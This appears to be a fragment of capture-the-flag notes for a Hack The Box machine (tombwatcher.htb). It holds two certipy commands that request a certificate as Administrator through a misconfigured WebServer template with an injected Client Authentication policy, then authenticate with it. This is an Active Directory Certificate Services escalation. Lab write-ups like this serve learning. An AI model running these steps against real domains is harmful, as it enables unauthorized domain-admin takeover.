![[Pasted image 20251012125540.png]]

```bash
certipy req -u cert_admin -p 'Pwned123!' -dc-ip 10.10.11.72 -ca "tombwatcher-CA-1" -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

```bash
certipy auth -dc-ip 10.10.11.72 -pfx administrator.pfx -username Administrator -domain tombwatcher.htb
```